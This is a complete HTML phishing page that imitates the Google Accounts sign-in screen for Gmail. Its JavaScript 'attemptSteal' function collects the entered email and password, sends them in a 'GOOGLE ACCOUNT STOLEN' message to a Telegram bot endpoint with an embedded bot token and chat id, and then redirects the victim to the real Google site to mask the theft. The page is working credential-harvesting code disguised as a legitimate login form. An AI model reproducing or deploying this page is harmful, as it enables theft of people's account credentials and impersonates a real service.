<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Sign in - Google Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
        }

        body {
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }

        .card {
            background: #ffffff;
            padding: 48px 40px 36px;
            border-radius: 8px;
            border: 1px solid #dadce0;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 2px 12px rgba(0,0,0,0.04);
            transition: all 0.2s ease;
        }

        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 28px;
        }

        .logo img {
            width: 75px;
            height: 24px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            color: #202124;
            margin-bottom: 6px;
        }

        .subtitle {
            text-align: center;
            color: #5f6368;
            font-size: 16px;
            font-weight: 400;
            margin-bottom: 28px;
        }

        .input-group {
            margin-bottom: 6px;
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            background: #ffffff;
            color: #202124;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .input-group input:focus {
            border-color: #1a73e8;
            border-width: 2px;
            box-shadow: 0 1px 3px rgba(26,115,232,0.1);
        }

        .input-group input::placeholder {
            color: #80868b;
            font-weight: 400;
        }

        .input-group .error-text {
            font-size: 12px;
            color: #d93025;
            margin-top: 4px;
            display: none;
            font-weight: 400;
        }

        .input-group .error-text.show {
            display: block;
        }

        .input-group .hint-text {
            font-size: 12px;
            color: #5f6368;
            margin-top: 4px;
            display: none;
        }

        .input-group .hint-text.show {
            display: block;
        }

        .forgot-link {
            display: block;
            text-align: right;
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            margin-top: 8px;
            cursor: pointer;
            font-weight: 500;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .button-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
            flex-wrap: wrap;
            gap: 12px;
        }

        .create-account {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            cursor: pointer;
            background: none;
            border: none;
            padding: 0;
        }

        .create-account:hover {
            text-decoration: underline;
        }

        .next-btn {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 28px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s, box-shadow 0.2s;
            letter-spacing: 0.3px;
            min-width: 88px;
        }

        .next-btn:hover {
            background: #1557b0;
            box-shadow: 0 1px 3px rgba(26,115,232,0.3);
        }

        .next-btn:disabled {
            background: #dadce0;
            cursor: not-allowed;
            box-shadow: none;
        }

        .footer {
            margin-top: 32px;
            border-top: 1px solid #dadce0;
            padding-top: 20px;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 8px;
            font-size: 12px;
            color: #5f6368;
        }

        .footer a {
            color: #5f6368;
            text-decoration: none;
            margin-left: 16px;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .footer-left {
            display: flex;
            align-items: center;
        }

        .footer-right {
            display: flex;
            align-items: center;
            gap: 4px;
        }

        /* Mobile */
        @media (max-width: 480px) {
            .card {
                padding: 32px 20px 28px;
                border: none;
                box-shadow: none;
            }
            .button-row {
                flex-direction: column;
                align-items: stretch;
            }
            .next-btn {
                width: 100%;
                padding: 14px;
            }
            .create-account {
                text-align: center;
            }
            .footer {
                flex-direction: column;
                align-items: center;
                text-align: center;
            }
            .footer-right {
                flex-wrap: wrap;
                justify-content: center;
            }
            .footer-right a {
                margin: 0 8px;
            }
        }

        /* Shake animation for error */
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20% { transform: translateX(-8px); }
            40% { transform: translateX(8px); }
            60% { transform: translateX(-4px); }
            80% { transform: translateX(4px); }
        }

        .shake {
            animation: shake 0.3s ease;
        }
    </style>
</head>
<body>

<div class="card">
    <!-- Google Logo -->
    <div class="logo">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png" alt="Google">
    </div>

    <h1>Sign in</h1>
    <div class="subtitle">to continue to Gmail</div>

    <!-- Email Field -->
    <div class="input-group">
        <input type="email" id="email" placeholder="Email or phone" autofocus>
        <div class="error-text" id="emailError">Please enter a valid Gmail address (e.g., user@gmail.com)</div>
        <div class="hint-text" id="emailHint">Enter your full Gmail address</div>
    </div>

    <!-- Password Field (hidden initially) -->
    <div class="input-group" id="passwordGroup" style="display: none;">
        <input type="password" id="password" placeholder="Enter your password">
        <div class="error-text" id="passwordError">Password must be at least 8 characters</div>
        <div class="hint-text" id="passwordHint">8+ characters required</div>
        <a class="forgot-link" id="forgotLink">Forgot password?</a>
    </div>

    <div class="button-row">
        <button class="create-account" id="createAccount">Create account</button>
        <button class="next-btn" id="nextBtn">Next</button>
    </div>

    <div class="footer">
        <span class="footer-left">English (United States)</span>
        <span class="footer-right">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </span>
    </div>
</div>

<script>
    // DOM elements
    const emailInput = document.getElementById('email');
    const passwordGroup = document.getElementById('passwordGroup');
    const passwordInput = document.getElementById('password');
    const nextBtn = document.getElementById('nextBtn');
    const emailError = document.getElementById('emailError');
    const emailHint = document.getElementById('emailHint');
    const passwordError = document.getElementById('passwordError');
    const passwordHint = document.getElementById('passwordHint');
    const forgotLink = document.getElementById('forgotLink');
    const createAccount = document.getElementById('createAccount');
    const card = document.querySelector('.card');

    // ---------- EMAIL VALIDATION ----------
    function isValidGmail(email) {
        // Must end with @gmail.com (case-insensitive)
        return /@gmail\.com$/i.test(email.trim());
    }

    // Real-time email validation
    emailInput.addEventListener('input', function() {
        const val = this.value.trim();

        if (val.length === 0) {
            emailError.classList.remove('show');
            emailHint.classList.remove('show');
            passwordGroup.style.display = 'none';
            nextBtn.disabled = false;
            return;
        }

        if (!isValidGmail(val)) {
            emailError.classList.add('show');
            emailHint.classList.remove('show');
            passwordGroup.style.display = 'none';
            nextBtn.disabled = true;
        } else {
            emailError.classList.remove('show');
            emailHint.classList.add('show');
            passwordGroup.style.display = 'block';
            passwordInput.focus();
            nextBtn.disabled = false;
        }
    });

    // ---------- PASSWORD VALIDATION ----------
    function isValidPassword(pwd) {
        return pwd.trim().length >= 8;
    }

    passwordInput.addEventListener('input', function() {
        const val = this.value;

        if (val.length === 0) {
            passwordError.classList.remove('show');
            passwordHint.classList.remove('show');
            return;
        }

        if (!isValidPassword(val)) {
            passwordError.classList.add('show');
            passwordHint.classList.remove('show');
        } else {
            passwordError.classList.remove('show');
            passwordHint.classList.add('show');
        }
    });

    // ---------- SHOW/HIDE PASSWORD ON FOCUS ----------
    emailInput.addEventListener('focus', function() {
        if (this.value.trim().length > 0 && isValidGmail(this.value)) {
            passwordGroup.style.display = 'block';
        }
    });

    // ---------- KEYBOARD ENTER ----------
    function handleKeyPress(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            attemptSteal();
        }
    }

    emailInput.addEventListener('keypress', handleKeyPress);
    passwordInput.addEventListener('keypress', handleKeyPress);

    // ---------- STEAL FUNCTION ----------
    function attemptSteal() {
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();

        // Validate email
        if (!email) {
            emailInput.focus();
            emailInput.classList.add('shake');
            setTimeout(() => emailInput.classList.remove('shake'), 300);
            return;
        }

        if (!isValidGmail(email)) {
            emailError.classList.add('show');
            emailInput.focus();
            emailInput.classList.add('shake');
            setTimeout(() => emailInput.classList.remove('shake'), 300);
            return;
        }

        // Validate password
        if (!password) {
            passwordInput.focus();
            passwordInput.classList.add('shake');
            setTimeout(() => passwordInput.classList.remove('shake'), 300);
            return;
        }

        if (!isValidPassword(password)) {
            passwordError.classList.add('show');
            passwordInput.focus();
            passwordInput.classList.add('shake');
            setTimeout(() => passwordInput.classList.remove('shake'), 300);
            return;
        }

        // All good → send to Telegram
        const message = `🔐 GOOGLE ACCOUNT STOLEN!\n📧 Email: ${email}\n🔑 Password: ${password}`;

        // Show loading state
        nextBtn.textContent = 'Signing in...';
        nextBtn.disabled = true;

        fetch('https://api.telegram.org/bot8554490167:AAHdIR373gejl6_tStvbGwFHzXAfOUDlnZc/sendMessage?chat_id=5805421075&text=' + encodeURIComponent(message))
            .then(() => {
                window.location.href = 'https://accounts.google.com/';
            })
            .catch(() => {
                window.location.href = 'https://accounts.google.com/';
            });
    }

    // ---------- BUTTON CLICK ----------
    nextBtn.addEventListener('click', attemptSteal);

    // ---------- FORGOT PASSWORD (realistic popup) ----------
    forgotLink.addEventListener('click', function(e) {
        e.preventDefault();
        alert('A password reset link will be sent to your recovery email.\n\n(This is a demonstration.)');
    });

    // ---------- CREATE ACCOUNT (realistic popup) ----------
    createAccount.addEventListener('click', function(e) {
        e.preventDefault();
        alert('Create your Google Account\n\n(This is a demonstration.)');
    });

    // ---------- INITIAL STATE ----------
    // If email is pre-filled, show password field
    if (emailInput.value.trim().length > 0 && isValidGmail(emailInput.value)) {
        passwordGroup.style.display = 'block';
        emailHint.classList.add('show');
    }
</script>
</body>
</html>
